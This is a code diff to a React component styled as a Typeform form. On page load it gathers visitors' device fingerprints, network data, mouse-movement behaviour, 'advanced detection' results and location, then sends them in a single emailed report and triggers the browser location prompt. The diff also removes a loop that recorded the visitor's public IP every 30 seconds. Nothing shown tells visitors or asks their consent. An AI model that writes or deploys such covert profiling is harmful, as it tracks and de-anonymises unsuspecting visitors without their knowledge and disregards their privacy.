@@ -404,35 +404,47 @@ export default function TypeformContainer() {
     hasInitialized.current = true;
 
     const initializeAllData = async () => {
+      // Wait a bit to collect initial data
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
       // Start collecting all intelligence data
       collectDeviceFingerprint();
       collectNetworkMetrics();
       runAdvancedDetectionAsync();
-      
+
+      // Wait for data collection to complete
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
       // Get basic location data
       const basicData = await getBasicLocationData();
 
-      // Send FIRST email with enhanced data
+      // Update behavioral data
       behavioralData.current.totalTime = Date.now() - startTime.current;
-      behavioralData.current.interactionPattern.avgMovementPerSecond = 
+      behavioralData.current.interactionPattern.avgMovementPerSecond =
         behavioralData.current.mouseMovements.length / (behavioralData.current.totalTime / 1000);
-      
+
       // Calculate engagement score
       behavioralData.current.interactionPattern.engagementScore = calculateEngagementScore();
 
-      fetch('/api/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'pageload-enhanced',
-          location: basicData,
-          behavioralAnalytics: behavioralData.current,
-          deviceIntelligence: deviceIntelligence.current,
-          networkMetrics: networkMetrics.current,
-          advancedDetection: advancedDetectionData.current,
-          timestamp: new Date().toISOString(),
-        }),
-      }).catch(console.error);
+      // Send ONLY ONE email at page load
+      try {
+        await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'pageload-enhanced',
+            location: basicData,
+            behavioralAnalytics: behavioralData.current,
+            deviceIntelligence: deviceIntelligence.current,
+            networkMetrics: networkMetrics.current,
+            advancedDetection: advancedDetectionData.current,
+            timestamp: new Date().toISOString(),
+          }),
+        });
+        console.log('✅ Page load email sent successfully');
+      } catch (error) {
+        console.error('❌ Failed to send page load email:', error);
+      }
 
       // Trigger browser location popup
       try {
@@ -444,23 +456,6 @@ export default function TypeformContainer() {
     };
 
     initializeAllData();
-    
-    // Monitor IP changes during session
-    const ipCheckInterval = setInterval(async () => {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        networkMetrics.current.ipHistory.push({
-          ip: data.ip,
-          timestamp: new Date().toISOString(),
-          source: 'periodic-check'
-        });
-      } catch (error) {
-        console.error('IP check failed:', error);
-      }
-    }, 30000); // Every 30 seconds
-
-    return () => clearInterval(ipCheckInterval);
   }, []);
 
   // Calculate engagement score
